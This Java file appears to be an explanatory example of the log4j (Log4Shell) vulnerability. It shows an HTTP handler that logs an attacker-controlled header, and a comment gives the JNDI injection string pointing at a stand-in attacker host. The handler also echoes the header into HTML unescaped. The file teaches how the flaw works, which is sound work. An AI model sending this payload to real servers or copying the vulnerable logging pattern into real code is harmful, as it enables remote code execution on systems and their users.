/*
How the log4J exploit works
Exploit Requirements

    A server with a vulnerable log4j version (listed above).
    An endpoint with any protocol (HTTP, TCP, etc), that allows an attacker to send the exploit string.
    A log statement that logs out the string from that request.

Example Vulnerable Code
 */

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.*;
import java.sql.SQLException;
import java.util.*;

public class VulnerableLog4jExampleHandler implements HttpHandler {

    static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());

    /**
     * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
     * This is pseudo-code to explain the vulnerability, and not a full example.
     * @param he HTTP Request Object
     */
    public void handle(HttpExchange he) throws IOException {
        String apiVersion = he.getRequestHeader("X-Api-Version");

        // This line triggers the RCE by logging the attacker-controlled HTTP header.
        // The attacker can set their X-Api-Version header to: ${jndi:ldap://some-attacker.com/a}
        log.info("Requested Api Version:{}", apiVersion);

        String response = "<h1>Hello from: " + apiVersion + "!</h1>";
        he.sendResponseHeaders(200, response.length());
        OutputStream os = he.getResponseBody();
        os.write(response.getBytes());
        os.close();
    }
}